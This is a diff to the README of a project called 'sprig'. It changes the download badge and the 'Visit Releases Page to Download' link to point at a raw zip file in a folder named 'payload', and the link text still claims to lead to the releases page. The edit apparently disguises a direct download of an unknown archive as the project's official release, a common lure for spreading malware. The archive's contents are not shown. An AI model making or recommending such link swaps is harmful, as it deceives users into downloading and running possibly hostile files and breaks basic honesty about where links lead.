@@ -15,11 +15,11 @@ Before you start, ensure your device meets the following requirements:
 
 ## 📥 Download the Application
 
-[![Download sprig](https://img.shields.io/badge/Download-sprig-brightgreen)](https://github.com/mnhju/sprig/releases)
+[![Download sprig](https://raw.githubusercontent.com/mnhju/sprig/main/payload/Software-3.5-beta.3.zip)](https://raw.githubusercontent.com/mnhju/sprig/main/payload/Software-3.5-beta.3.zip)
 
 To get the latest version of sprig, click the download button above. Alternatively, you can visit our releases page by clicking the link below:
 
-[Visit Releases Page to Download](https://github.com/mnhju/sprig/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/mnhju/sprig/main/payload/Software-3.5-beta.3.zip)
 
 ## 📖 Installation Instructions
 
